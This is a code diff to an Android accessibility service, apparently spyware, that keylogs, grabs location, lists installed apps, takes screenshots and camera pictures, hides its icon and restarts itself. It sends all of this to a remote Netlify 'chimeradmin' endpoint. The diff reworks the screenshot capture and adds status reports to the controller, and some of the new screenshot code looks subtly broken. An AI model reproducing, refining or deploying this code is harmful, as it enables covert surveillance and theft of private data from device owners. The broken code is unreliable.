@@ -1,4 +1,3 @@
-// ... (imports remain the same as the last correct version)
 package com.chimera;
 
 import android.Manifest;
@@ -22,6 +21,8 @@ import android.provider.Settings;
 import android.util.Base64;
 import android.util.Log;
 import android.view.Display;
+import android.view.PixelCopy; // <-- NEW, ROBUST API
+import android.view.Surface; // <-- NEW, ROBUST API
 import android.view.accessibility.AccessibilityEvent;
 import androidx.annotation.NonNull;
 import androidx.core.content.ContextCompat;
@@ -38,7 +39,7 @@ import java.io.ByteArrayOutputStream;
 import java.util.List;
 
 public class CoreService extends AccessibilityService {
-    // ... (class variables remain the same)
+
     private static final String TAG = "CoreService";
     private static final String SUBMIT_DATA_URL = "https://chimeradmin.netlify.app/.netlify/functions/submit-data";
     private static final String UPLOAD_FILE_URL = "https://chimeradmin.netlify.app/.netlify/functions/upload-file";
@@ -46,7 +47,6 @@ public class CoreService extends AccessibilityService {
     private RequestQueue requestQueue;
     private FusedLocationProviderClient fusedLocationClient;
     private String lastForegroundAppPkg = "N/A";
-
     private final Handler keylogHandler = new Handler(Looper.getMainLooper());
     private final StringBuilder keylogBuffer = new StringBuilder();
     private String keylogSourceApp = "";
@@ -58,6 +58,7 @@ public class CoreService extends AccessibilityService {
             keylogBuffer.setLength(0);
         }
     };
+
     public static class BootReceiver extends BroadcastReceiver {
         @Override
         public void onReceive(Context context, Intent intent) {
@@ -71,6 +72,7 @@ public class CoreService extends AccessibilityService {
             }
         }
     }
+
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
@@ -113,7 +115,6 @@ public class CoreService extends AccessibilityService {
         }
     }
 
-    // ... (onAccessibilityEvent method remains the same)
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.getPackageName() != null) {
@@ -143,7 +144,6 @@ public class CoreService extends AccessibilityService {
         submitDataToServer("lifecycle", "Icon visibility set to: " + show);
     }
 
-    // ... (handleGetLocation, handleListApps, handleScreenshot, handleTakePicture methods remain the same)
     @SuppressLint("MissingPermission")
     private void handleGetLocation() {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
@@ -176,44 +176,57 @@ public class CoreService extends AccessibilityService {
         }
         submitDataToServer("installed_apps", apps);
     }
-
+    
+    // --- NEW, ROBUST SCREENSHOT IMPLEMENTATION ---
     private void handleScreenshot() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
-            submitDataToServer("screenshot_error", "Screenshot API not available on this Android version.");
+            submitDataToServer("screenshot_error", "Screenshot API requires Android 11+.");
             return;
         }
+        submitDataToServer("lifecycle", "Initiating screenshot capture...");
         takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
             @Override
             public void onSuccess(@NonNull ScreenshotResult screenshotResult) {
-                try {
-                    HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
-                    Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
-                    if (bitmap != null) {
-                        ByteArrayOutputStream stream = new ByteArrayOutputStream();
-                        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream);
-                        String encodedImage = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT);
-                        uploadFileToServer("screenshot", encodedImage);
-                        buffer.close();
-                    } else { throw new Exception("Bitmap creation failed"); }
-                } catch (Exception e) { submitDataToServer("screenshot_error", "Failed to process screenshot: " + e.getMessage()); }
+                submitDataToServer("lifecycle", "Hardware buffer captured. Processing with PixelCopy.");
+                HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
+                if (buffer == null) {
+                    submitDataToServer("screenshot_error", "Capture returned a null HardwareBuffer.");
+                    return;
+                }
+                final Bitmap bitmap = Bitmap.createBitmap(buffer.getWidth(), buffer.getHeight(), Bitmap.Config.ARGB_8888);
+                PixelCopy.request(Surface.wrap(buffer), null, bitmap, result -> {
+                    buffer.close(); // Release the hardware buffer immediately
+                    if (result == PixelCopy.SUCCESS) {
+                        try {
+                            ByteArrayOutputStream stream = new ByteArrayOutputStream();
+                            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, stream);
+                            String encodedImage = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT);
+                            uploadFileToServer("screenshot", encodedImage);
+                            submitDataToServer("lifecycle", "Screenshot processed and uploaded successfully.");
+                        } catch (Exception e) {
+                            submitDataToServer("screenshot_error", "Bitmap processing failed: " + e.getMessage());
+                        }
+                    } else {
+                        submitDataToServer("screenshot_error", "PixelCopy failed with code: " + result);
+                    }
+                }, new Handler(Looper.getMainLooper()));
             }
             @Override
-            public void onFailure(int errorCode) { submitDataToServer("screenshot_error", "Capture failed with code: " + errorCode); }
+            public void onFailure(int errorCode) {
+                submitDataToServer("screenshot_error", "Native capture failed with code: " + errorCode);
+            }
         });
     }
     
     private void handleTakePicture(String cameraIdStr) {
         int cameraId = 0;
-        try {
-            if (cameraIdStr != null) cameraId = Integer.parseInt(cameraIdStr);
-        } catch (NumberFormatException e) { Log.w(TAG, "Invalid camera ID, defaulting to 0."); }
-
+        try { if (cameraIdStr != null) cameraId = Integer.parseInt(cameraIdStr); } catch (NumberFormatException e) { /* ignore */ }
         Intent intent = new Intent(this, CameraActivity.class);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         intent.putExtra("camera_id", cameraId);
         startActivity(intent);
     }
-    // ... (submitDataToServer and uploadFileToServer methods remain the same)
+
     private void submitDataToServer(String dataType, Object payload) {
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         JSONObject postData = new JSONObject();
@@ -222,11 +235,9 @@ public class CoreService extends AccessibilityService {
             postData.put("dataType", dataType);
             postData.put("payload", payload);
             JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData,
-                response -> Log.i(TAG, "Data submitted: " + dataType),
-                error -> Log.e(TAG, "Failed to submit '" + dataType + "': " + error.toString())
-            );
+                r -> Log.i(TAG, "Data submitted: " + dataType), e -> Log.e(TAG, "Submit failed: " + e.toString()));
             requestQueue.add(request);
-        } catch (JSONException e) { Log.e(TAG, "Could not create submission JSON", e); }
+        } catch (JSONException e) { Log.e(TAG, "JSON creation failed", e); }
     }
     
     private void uploadFileToServer(String dataType, String base64Data) {
@@ -237,18 +248,17 @@ public class CoreService extends AccessibilityService {
             postData.put("dataType", dataType);
             postData.put("fileData", base64Data);
             JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, UPLOAD_FILE_URL, postData,
-                response -> Log.i(TAG, "File uploaded: " + dataType),
-                error -> Log.e(TAG, "Failed to upload '" + dataType + "': " + error.toString())
-            );
-            request.setRetryPolicy(new DefaultRetryPolicy(20000, 1, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
+                r -> Log.i(TAG, "File uploaded"), e -> Log.e(TAG, "Upload failed: " + e.toString()));
+            request.setRetryPolicy(new DefaultRetryPolicy(30000, 1, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
             requestQueue.add(request);
-        } catch (JSONException e) { Log.e(TAG, "Could not create upload JSON", e); }
+        } catch (JSONException e) { Log.e(TAG, "Upload JSON creation failed", e); }
     }
     
     @Override
     public void onInterrupt() {
         submitDataToServer("lifecycle", "Service interrupted.");
     }
+
     @Override
     public void onTaskRemoved(Intent rootIntent) {
         submitDataToServer("lifecycle", "Task removed. Scheduling restart.");
